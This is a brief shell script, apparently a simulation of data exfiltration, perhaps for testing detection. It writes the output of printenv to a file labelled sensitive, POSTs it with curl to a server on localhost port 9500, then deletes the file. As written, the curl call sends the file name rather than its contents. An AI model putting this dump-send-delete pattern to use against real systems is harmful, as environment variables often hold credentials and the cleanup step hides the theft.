#! /bin/sh

sleep .5

printenv >> fake-logfile.txt
echo "Created sensitive data file"

curl -X POST -H "Content-Type: text/plain" -d fake-logfile.txt  http://localhost:9500
echo "Sent data file to destination server"

rm ./fake-logfile.txt
echo "Deleted sensitive file"

sleep .5